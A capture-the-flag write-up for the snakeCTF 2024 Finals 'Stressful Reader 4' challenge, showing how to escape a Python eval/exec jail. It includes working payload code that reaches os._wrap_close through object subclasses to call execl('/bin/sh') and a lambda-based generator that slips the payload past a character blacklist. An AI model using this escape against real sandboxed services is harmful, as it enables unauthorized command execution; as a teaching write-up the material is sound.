# Stressful Reader 4 [_snakeCTF 2024 Finals_]

**Category**: misc

## Description

This is the last one, I promise!

## Solution

_I really mean it, this will be the last one._

Before reading the solution, please take a look at the solution of [Stressful Reader 2](https://github.com/MadrHacks/snakeCTF2024-writeups/tree/main/misc/stressful-reader-2) and [Stressful Reader 3](https://github.com/MadrHacks/snakeCTF2024-writeups/tree/main/misc/stressful-reader-3) as it is going to build on the concepts presented there.


The main changes from Stressful Reader 3 that make the exploitation more difficult are the following:

1. There is an input length limit of 6000 characters
2. The string provided as input is first `eval`uated and its result saved
3. The result of the evaluation gets then `exec`uted, with all the buit-ins disabled


The solution requires once again to generate a lot of `lambda` function in order to decompose the strings in `dir(self)` (where self is the instance of the `Jail` class in which the code is executed) and build a string that when evaluated prints the flag. The input length limit requires also the attack payload to be optimized a little bit, so creating `lambda`s where the argument list is `a,aa,aaa,aaaa...` won't help in this case.

Since the input is passed to `eval` and then to `exec`, the input should evaluate to something that is able to execute malicious code _after_ it has been evaluated.
Searching for _"python ctf calling function without builtins"_ on the web gives [this writeup](https://ctftime.org/writeup/27649) as one of the first results, where some _strong hints_ on how to build a working payload are given.

After a bit of experimentation, it should be fairly easy to find that for the challenge's Python version, this piece of code evaluates to `os._wrap_close`:

```python
('a').__class__.__base__.__subclasses__()[155]
```

and with a few more steps it is possible to execute an arbitrary program:

```python
('a').__class__.__base__.__subclasses__()[155].__init__.__globals__['execl']('/bin/sh', '/bin/sh')
```

Great! Now the only problem is that there is no direct access to the `[` and `]` because they are blacklisted, so again the `lambda` trick has to be used. To ease the task, it's better to define a function that generates automatically an optimized list of parameters for a `lambda` function by using only characters which are not blacklisted:

```python
def get_param_names(s):
    available="abdefgilmrstv"
    comb = sorted(set(itertools.combinations(available,4)))
    params = [''.join(comb.pop()) for _ in s]
    return params
```

Then this code will be equivalent to the above and call `/bin/sh`:

```python
    params = get_param_names(range(163))
    dict_params = get_param_names(range(406))
    execl_index = 372
    code = (
        f"(lambda {','.join(params)} : " +
            f"(lambda {','.join(dict_params)} : (lambda _, val: val('/bin/sh', '/bin/sh'))(*{dict_params[execl_index]}))(*{params[155]}.__init__.__globals__.items()))" +
        f"(*('a').__class__.__base__.__subclasses__())"
    )
```

In the above code `params` represents the elements in the list given by `('a').__class__.__base__.__subclasses__()`, and `dict_params` represents the elements in `('a').__class__.__base__.__subclasses__()[155].__init__.__globals__`.

**Remember**, this is the code that will be executed by `exec`, so actually what is missing is the payload that _evaluates to it_.

Why not defining directly a function that given an arbitrary payload tries to rewrite it using only `lambda` functions, the characters from `dir(self)` and the characters which are not blacklisted? `build_string_with_lambdas` enters the room:

```python
def build_string_with_lambdas(wanted, list_of_strings=dir_self):
    global title

    def get_slash():
        idx = title.find("/")
        title_params = get_param_names(title)
        return f"(lambda {','.join(title_params)}: {title_params[idx]})(*self.title)"

    params = get_param_names(list_of_strings)
    string_found = False
    i = 0

    split = re.split(r"[/]", wanted)
    output = ""
    encoded_list = []

    for idx, wanted in enumerate(split):
        if wanted == '':
            encoded_list.append('')
            continue

        last_char_was_not_in_badchars = False
        output = f"(lambda {','.join(params)} : "

        for char in wanted:
            i = 0
            string_found = False

            if char not in badchars:
                if last_char_was_not_in_badchars:
                    output = output[:-2]
                    output += f'{char}"+'
                else:
                    output += f'"{char}"+'
                last_char_was_not_in_badchars = True
            else:
                last_char_was_not_in_badchars = False
                # find the first string in list_of_strings that provides char
                while i < len(list_of_strings) and (not string_found):
                    if (char in list_of_strings[i]):
                        # print(char, "found in ", list_of_strings[i])
                        string_found = True
                    else:
                        i += 1

                assert(i < len(list_of_strings)), f"search failed for {char}"

                source_of_chars = get_param_names(list_of_strings[i])
                idx_of_char = list_of_strings[i].find(char)
                # print("idx of", char, "in", list_of_strings[i], ":", idx_of_char)

                output += f"(lambda {','.join(source_of_chars)} : {source_of_chars[idx_of_char]})(*{params[i]})+"

        # remove last "+" from output
        output = output[:-1]
        output += ")(*dir(self))"
        encoded_list.append(output)

    out = f"+ {get_slash()} + ".join(encoded_list)
    if split[-1] == '':
        out = out[:-2] # hack to get arout the last "+" if the last wanted is ''
    return out
```

This function is ugly but it does the job. The only thing to worry about is that `build_string_with_lambdas("some string")` will return a string that evaluates to `"some string"` in a way that the blacklist checks are bypassed.

With this handy function, the final payload can be generated simply with:

```python
params = get_param_names(range(163))
dict_params = get_param_names(range(406))
execl_index = 372
code = (
    f"(lambda {','.join(params)} : " +
        f"(lambda {','.join(dict_params)} : (lambda _, val: val('/bin/sh', '/bin/sh'))(*{dict_params[execl_index]}))(*{params[155]}.__init__.__globals__.items()))" +
    f"(*('a').__class__.__base__.__subclasses__())"
)

payload = build_string_with_lambdas(code)
```

_And the Python magic happens._